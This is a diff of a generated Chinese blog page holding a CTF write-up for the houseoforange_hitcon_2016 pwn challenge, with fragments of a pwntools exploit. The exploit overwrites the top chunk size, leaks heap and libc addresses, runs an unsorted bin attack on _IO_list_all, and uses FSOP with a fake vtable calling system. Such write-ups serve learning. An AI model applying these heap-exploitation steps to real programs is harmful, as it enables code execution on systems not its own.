@@ -222,7 +222,7 @@
           <a href="https://hikawa.ml/" title="https:&#x2F;&#x2F;hikawa.ml&#x2F;" rel="noopener" target="_blank">Akira</a>
         </li>
         <li class="links-of-blogroll-item">
-          <a href="https://x9un.github.io/" title="https:&#x2F;&#x2F;x9un.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
+          <a href="https://ugi57.github.io/" title="https:&#x2F;&#x2F;ugi57.github.io&#x2F;" rel="noopener" target="_blank">_357</a>
         </li>
         <li class="links-of-blogroll-item">
           <a href="https://altonhe.github.io/" title="https:&#x2F;&#x2F;altonhe.github.io&#x2F;" rel="noopener" target="_blank">Trotsky</a>
@@ -359,13 +359,16 @@
     <div class="post-body" itemprop="articleBody">
         <p>buuoj刷pwn题之houseoforange_hitcon_2016</p>
 <span id="more"></span>
-
 <p>参考文章：<a target="_blank" rel="external nofollow noopener noreferrer" href="https://bbs.pediy.com/thread-222718.htm">https://bbs.pediy.com/thread-222718.htm</a></p>
-<p>保护全开<br><img src="/images/6a6ded9c/1.png" alt="upload successful"></p>
+<p>保护全开<br>
+<img src="/images/6a6ded9c/1.png" alt="upload successful"></p>
 <p>有add，show，edit，没free</p>
-<p>add只有4次：<br><img src="/images/6a6ded9c/2.png" alt="upload successful"></p>
-<p>show<br><img src="/images/6a6ded9c/3.png" alt="upload successful"></p>
-<p>edit只有3次，但是写入数据的长度可控，可溢出<br><img src="/images/6a6ded9c/4.png" alt="upload successful"></p>
+<p>add只有4次：<br>
+<img src="/images/6a6ded9c/2.png" alt="upload successful"></p>
+<p>show<br>
+<img src="/images/6a6ded9c/3.png" alt="upload successful"></p>
+<p>edit只有3次，但是写入数据的长度可控，可溢出<br>
+<img src="/images/6a6ded9c/4.png" alt="upload successful"></p>
 <p>house of orange具体在没有free功能的情况下，制造出free的chunk，思路是溢出修改top chunk的size，然后malloc比top chunk大的chunk，使得top chunk被释放进入unsorted bin</p>
 <p>一些检查：</p>
 <ul>
@@ -381,11 +384,9 @@ fake_name <span class="token operator">+=</span> p32<span class="token punctuati
 fake_name <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0xf31</span><span class="token punctuation">)</span> <span class="token comment"># top chunk: pre_size, size</span>
 
 edit<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>fake_name<span class="token punctuation">)</span><span class="token punctuation">,</span> fake_name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><img src="/images/6a6ded9c/5.png" alt="upload successful"></p>
 <p>malloc一个比top chunk大的chunk，top chunk将会被释放进入unsorted bin</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span> <span class="token comment"># free top chunk</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-
 <p><img src="/images/6a6ded9c/6.png" alt="upload successful"></p>
 <p>之后再malloc一个large bin大小的chunk，将从unsorted bin切割出来，bk仍然存有main_arena的地址，bk后面的fd_nextsize又有堆的地址，可以泄露出来</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token comment"># 从unsorted bin中切割一块出来 'a' * 8 是fd，后面就是bk</span>
@@ -400,7 +401,6 @@ show<span class="token punctuation">(</span><span class="token punctuation">)</s
 ru<span class="token punctuation">(</span><span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x10</span><span class="token punctuation">)</span>
 addr <span class="token operator">=</span> uu64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 hbase <span class="token operator">=</span> addr <span class="token operator">&amp;</span> <span class="token number">0xffFFffFFffFFf000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p><img src="/images/6a6ded9c/7.png" alt="upload successful"></p>
 <p>之后就是unsorted bin attack，修改_IO_list_all为unsorted bin的地址，而unsorted bin + 0x68(_IO_FILE_plus的_chain字段)是0x60大小的small chunk，要是把覆盖unsorted bin 中的chunk的size成0x60，那么_chain将填成这个chunk的地址，就把这个chunk当成_IO_FILE_plus结构了</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">pay <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x400</span>
@@ -415,10 +415,10 @@ pay <span class="token operator">+=</span> fake_file
 edit<span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>pay<span class="token punctuation">)</span><span class="token punctuation">,</span> pay<span class="token punctuation">)</span>
 
 add<span class="token punctuation">(</span><span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">'aaa'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-
-<p>通过unsorted bin attack将_IO_list_all改成unsorted bin的地址<br><img src="/images/6a6ded9c/8.png" alt="upload successful"></p>
-<p>并且+0x68处，已经改成这个chunk的地址<br><img src="/images/6a6ded9c/9.png" alt="upload successful"></p>
+<p>通过unsorted bin attack将_IO_list_all改成unsorted bin的地址<br>
+<img src="/images/6a6ded9c/8.png" alt="upload successful"></p>
+<p>并且+0x68处，已经改成这个chunk的地址<br>
+<img src="/images/6a6ded9c/9.png" alt="upload successful"></p>
 <p>开始FSOP</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python">
 pay <span class="token operator">=</span> <span class="token string">'a'</span> <span class="token operator">*</span> <span class="token number">0x400</span>
@@ -439,7 +439,6 @@ fake_vtable <span class="token operator">=</span> p64<span class="token punctuat
 fake_vtable <span class="token operator">+=</span> p64<span class="token punctuation">(</span>lbase <span class="token operator">+</span> ctx<span class="token punctuation">.</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># _IO_OVERFLOW</span>
 
 pay <span class="token operator">+=</span> fake_file <span class="token operator">+</span> fake_vtable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
 <p>完整exp:</p>
 <pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#coding=utf8</span>
 <span class="token comment">#!/usr/bin/python2</span>
@@ -551,18 +550,6 @@ sla<span class="token punctuation">(</span><span class="token string">'choice : 
 
 irt<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-
-
-
-
-
-
-
-
-
-
-
-
     </div>
 
     
@@ -653,13 +640,13 @@ irt<span class="token punctuation">(</span><span class="token punctuation">)</sp
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">380k</span>
+    <span title="站点总字数">379k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">5:46</span>
+    <span title="站点阅读时长">5:45</span>
   </span>
 </div>
 <div class="busuanzi-count">
